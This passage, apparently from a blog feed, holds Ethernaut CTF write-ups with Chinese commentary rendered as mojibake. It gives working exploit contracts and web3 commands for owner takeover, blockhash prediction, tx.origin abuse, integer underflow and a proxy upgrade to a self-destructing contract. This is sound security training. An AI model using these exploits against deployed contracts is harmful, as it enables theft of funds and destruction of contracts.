çš„åœ°å€è°ƒç”¨åˆå§‹åŒ–</span><br>initializeData = web3.eth.abi.encodeFunctionSignature(<span class="hljs-string">&quot;initialize()&quot;</span>)<br><span class="hljs-comment">//&#x27;0x8129fc1c&#x27;</span><br><span class="hljs-keyword">await</span> web3.eth.sendTransaction(&#123; <span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: implAddr, <span class="hljs-attr">data</span>: initializeData &#125;)<br><br><span class="hljs-comment">//è®¾ç½® upgrader å¹¶éªŒè¯</span><br>upgraderData = web3.eth.abi.encodeFunctionSignature(<span class="hljs-string">&quot;upgrader()&quot;</span>)<br><span class="hljs-comment">//&#x27;0xaf269745&#x27;</span><br><span class="hljs-keyword">await</span> web3.eth.call(&#123;<span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: implAddr, <span class="hljs-attr">data</span>: upgraderData&#125;).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> <span class="hljs-string">&#x27;0x&#x27;</span> + v.slice(-<span class="hljs-number">40</span>).toLowerCase()) === player.toLowerCase()<br><span class="hljs-comment">//true</span><br><br><span class="hljs-comment">//éƒ¨ç½² attackEngine åˆçº¦å¹¶è®¾ç½®åˆçº¦åœ°å€</span><br>attackAddr = <span class="hljs-string">&#x27;0x030e5e8743dFb45E68D9010200b9aADeB7578EcF&#x27;</span><br><span class="hljs-comment">//&#x27;0x030e5e8743dFb45E68D9010200b9aADeB7578EcF&#x27;</span><br>explodeData = web3.eth.abi.encodeFunctionSignature(<span class="hljs-string">&quot;explode()&quot;</span>)<br><span class="hljs-comment">//&#x27;0xb8b3dbc6&#x27;</span><br><br><span class="hljs-comment">//å‡çº§åˆçº¦</span><br>upgradeSignature = &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;upgradeToAndCall&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;function&#x27;</span>,<br>    <span class="hljs-attr">inputs</span>: [<br>        &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;address&#x27;</span>,<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;newImplementation&#x27;</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;bytes&#x27;</span>,<br>            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;data&#x27;</span><br>        &#125;<br>    ]<br>&#125;<br>upgradeParams = [attackAddr, explodeData]<br><br>upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)<br><span class="hljs-comment">//&#x27;0x4f1ef286000000000000000000000000030e5e8743dfb45e68d9010200b9aadeb7578ecf00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004b8b3dbc600000000000000000000000000000000000000000000000000000000&#x27;</span><br><br><span class="hljs-comment">//åœ¨ implAddr è°ƒç”¨ upgradeToAndCall</span><br><span class="hljs-keyword">await</span> web3.eth.sendTransaction(&#123;<span class="hljs-attr">from</span>: player, <span class="hljs-attr">to</span>: implAddr, <span class="hljs-attr">data</span>: upgradeData&#125;)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220313194207096.png" alt="image-20220313194207096"></p>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Ethernaut Part â… </title>
    <link href="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ethernaut.zeppelin.solutions/">å¹³å°åœ°å€</a></p><h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h2><h3 id="é—¯å…³è¦æ±‚"><a href="#é—¯å…³è¦æ±‚" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><ul><li>æˆä¸ºåˆçº¦çš„owner</li><li>å°†ä½™é¢å‡å°‘ä¸º0</li></ul><h3 id="åˆçº¦ä»£ç "><a href="#åˆçº¦ä»£ç " class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Fallback &#123;<br><br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public contributions;<br>  address payable public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    owner.transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ"><a href="#åˆçº¦åˆ†æ" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><h3 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li><p>é¦–å…ˆç‚¹å‡»â€Get new instanceâ€æ¥è·å–ä¸€ä¸ªå®ä¾‹</p></li><li><p>æŸ¥çœ‹åˆçº¦åœ°å€çš„èµ„äº§æ€»é‡</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">await</span> <span class="hljs-function"><span class="hljs-title">getBlance</span>(<span class="hljs-variable">instance</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>å‘åˆçº¦è½¬1weiï¼Œä½¿è´¡çŒ®å€¼å¤§äº0</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">await</span> contract.contribute(&#123;value:<span class="hljs-number">1</span>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>å†æ¬¡è·å–balanceï¼Œæ£€æŸ¥æ˜¯å¦æˆåŠŸæ”¹å˜</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">await</span> <span class="hljs-function"><span class="hljs-title">getBlance</span>(<span class="hljs-variable">instance</span>)</span><br></code></pre></td></tr></table></figure></li><li><p>é€šè¿‡è°ƒç”¨sendTransactionå‡½æ•°æ¥è§¦å‘fallbackå‡½æ•°</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">await contract.send<span class="hljs-constructor">Transaction(&#123;<span class="hljs-params">value</span>:1&#125;)</span><br></code></pre></td></tr></table></figure></li><li><p>ç­‰äº¤æ˜“å®Œæˆåå†æ¬¡æŸ¥çœ‹åˆçº¦çš„ownerï¼Œå‘ç°æˆåŠŸå˜ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">await</span> contract.owner()<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨withdrawæ¥è½¬èµ°åˆçº¦çš„æ‰€æœ‰ä»£å¸</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">await</span> contract.withdraw()<br></code></pre></td></tr></table></figure></li><li><p>ç‚¹å‡»â€submit instanceâ€å³å¯å®Œæˆé—¯å…³</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128141052114.png" alt="image-20220128141052114"></p></li></ol><h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h2><h3 id="é—¯å…³è¦æ±‚-1"><a href="#é—¯å…³è¦æ±‚-1" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è·å¾—åˆçº¦æ‰€æœ‰æƒ</p><h3 id="åˆçº¦ä»£ç -1"><a href="#åˆçº¦ä»£ç -1" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  // constructor <br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-1"><a href="#åˆçº¦åˆ†æ-1" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>æ„é€ å‡½æ•°åç§°ä¸åˆçº¦åç§°ä¸ä¸€è‡´ï¼ŒåŒæ—¶åœ¨æ„é€ å‡½æ•°ä¸­æŒ‡å®šäº†å‡½æ•°è°ƒç”¨è€…ç›´æ¥ä¸ºåˆçº¦çš„owner</p><h3 id="æ”»å‡»æµç¨‹-1"><a href="#æ”»å‡»æµç¨‹-1" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li><p>ç‚¹å‡»â€œGet new instanceâ€æ¥è·å–ç¤ºä¾‹</p></li><li><p>è°ƒç”¨æ„é€ å‡½æ•°æ¥æ›´æ¢owner</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">await</span> contract.Fal<span class="hljs-number">1</span>out()<br></code></pre></td></tr></table></figure></li><li><p>ç‚¹å‡»â€œsubmit instanceâ€æ¥æäº¤ç­”æ¡ˆ</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128155228067.png" alt="image-20220128155228067"></p></li></ol><h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h2><h3 id="é—¯å…³è¦æ±‚-2"><a href="#é—¯å…³è¦æ±‚-2" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚</p><h3 id="åˆçº¦ä»£ç -2"><a href="#åˆçº¦ä»£ç -2" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract CoinFlip &#123;<br><br>  using SafeMath for uint256;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number.sub(1)));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-2"><a href="#åˆçº¦åˆ†æ-2" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p><a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">éšæœºæ•°é—®é¢˜</a></p><p>è¿™é¢˜å°±æ˜¯ç”¨äº†<code>block.blockhash(block.number-1)</code>ï¼Œè¿™ä¸ªè¡¨ç¤ºä¸Šä¸€å—çš„hashï¼Œç„¶åå»é™¤ä»¥<code>2^255</code></p><h3 id="æ”»å‡»æµç¨‹-2"><a href="#æ”»å‡»æµç¨‹-2" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract CoinFlip &#123;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number-1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue/FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public con_addr = 0x50F027e7e09791A2DbC86E38AbdC1f8FE41d7A9B; //æ­¤å¤„æ˜¯å®ä¾‹åœ°å€<br>    CoinFlip expFlip = CoinFlip(con_addr);<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>    function guess() public &#123;<br>        uint256 blockValue = uint256(block.blockhash(block.number-1));<br>        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);<br>        bool guess = coinFlip == 1 ? true : false;<br>        expFlip.flip(guess);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨remixä¸­éƒ¨ç½²åˆçº¦ï¼Œå¹¶ç‚¹å‡»guessåæ¬¡</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209220508976.png" alt="image-20220209220508976"></p><p>æœŸé—´å¯ä½¿ç”¨ <code>await contract.consecutiveWins()</code> æ¥æŸ¥è¯¢æˆåŠŸæ¬¡æ•°</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209221813609.png" alt="image-20220209221813609"></p><h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h2><h3 id="é—¯å…³è¦æ±‚-3"><a href="#é—¯å…³è¦æ±‚-3" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è·å–åˆçº¦çš„owneræƒé™</p><h3 id="åˆçº¦ä»£ç -3"><a href="#åˆçº¦ä»£ç -3" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-3"><a href="#åˆçº¦åˆ†æ-3" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>è¿™é‡Œæ¶‰åŠåˆ°äº†tx.originå’Œmsg.senderçš„åŒºåˆ«ï¼Œå‰è€…è¡¨ç¤ºäº¤æ˜“çš„å‘é€è€…ï¼Œåè€…åˆ™è¡¨ç¤ºæ¶ˆæ¯çš„å‘é€è€…ï¼Œå¦‚æœæƒ…æ™¯æ˜¯åœ¨ä¸€ä¸ªåˆçº¦ä¸‹çš„è°ƒç”¨ï¼Œé‚£ä¹ˆè¿™ä¸¤è€…æ˜¯æœ¨æœ‰åŒºåˆ«çš„ï¼Œä½†æ˜¯å¦‚æœæ˜¯åœ¨å¤šä¸ªåˆçº¦çš„æƒ…å†µä¸‹ï¼Œæ¯”å¦‚ç”¨æˆ·é€šè¿‡Aåˆçº¦æ¥è°ƒç”¨Båˆçº¦ï¼Œé‚£ä¹ˆå¯¹äºBåˆçº¦æ¥è¯´ï¼Œmsg.senderå°±ä»£è¡¨åˆçº¦Aï¼Œè€Œtx.originå°±ä»£è¡¨ç”¨æˆ·</p><h3 id="æ”»å‡»æµç¨‹-3"><a href="#æ”»å‡»æµç¨‹-3" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    Telephone target = Telephone(0x2b5e81876E14b3E0E1337F6BA7bc4A2d8844c904);//å®ä¾‹åœ°å€<br><br>    function attack() public &#123;<br>        target.changeOwner(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624);//è‡ªå·±çš„åœ°å€<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä½¿ç”¨<code>await contract.owner()</code>æ¥æŸ¥è¯¢åˆçº¦çš„owner</p><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220216172446013.png" alt="image-20220216172446013"></p><h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h2><h3 id="é—¯å…³è¦æ±‚-4"><a href="#é—¯å…³è¦æ±‚-4" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯æ”»ç ´ä¸‹é¢è¿™ä¸ªåŸºç¡€ token åˆçº¦</p><p>ä½ æœ€å¼€å§‹æœ‰20ä¸ª token, å¦‚æœä½ é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¢åŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡,ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸€å…³,å½“ç„¶è¶Šå¤šè¶Šå¥½  </p><h3 id="åˆçº¦ä»£ç -4"><a href="#åˆçº¦ä»£ç -4" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-4"><a href="#åˆçº¦åˆ†æ-4" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>æ•´æ•°æº¢å‡º</p><p>è¿™é‡Œçš„balanceså’Œvalueéƒ½æ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•ä»–ä»¬ç›¸å‡ä¹‹åå€¼ä¾æ—§å¤§äºç­‰äº0</p><h3 id="æ”»å‡»æµç¨‹-4"><a href="#æ”»å‡»æµç¨‹-4" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public con_addr = 0xf36B064eB8f9120392C6b352210566D6D8340700;<br>    address public trans_to = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;<br>    Token token = Token(con_addr);<br>    uint overvalue = 21;<br><br>    function attack() public &#123;<br>        token.transfer(trans_to,overvalue);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221164154258.png" alt="image-20220221164154258"></p><h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h2><h3 id="é—¯å…³è¦æ±‚-5"><a href="#é—¯å…³è¦æ±‚-5" class="headerlink" 